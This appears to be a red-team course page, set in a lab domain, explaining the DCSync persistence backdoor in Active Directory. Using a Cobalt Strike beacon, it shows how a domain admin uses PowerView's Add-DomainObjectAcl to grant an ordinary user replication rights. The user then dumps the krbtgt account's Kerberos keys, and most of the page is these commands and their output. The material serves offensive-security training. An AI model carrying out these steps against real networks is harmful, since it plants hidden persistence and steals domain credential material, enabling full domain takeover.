DCSync is a technique which replicates the MS-DRSR protocol to replicate AD information, including password hashes. Under normal circumstances, this is only ever performed by (and between) Domain Controllers. There are specific DACLs relating to DCSync called **Replicating Directory Changes [All/In Filtered Set]**, which by default is only granted to Enterprise/Domain Admins and Domain Controllers.

These are set on the root domain object. Enterprise/Domain Admins can also modify these DACLs, and can therefore grant the Replicating Directory Change rights to other principals, whether that be a user, group or computer.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```
  

`Add-DomainObjectAcl` from PowerView can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer).

```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

  

Once the change has been made, inspect the domain object and you will see the changes that have been made.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/dcsync-backdoor.png)

  

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

[...snip...]

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```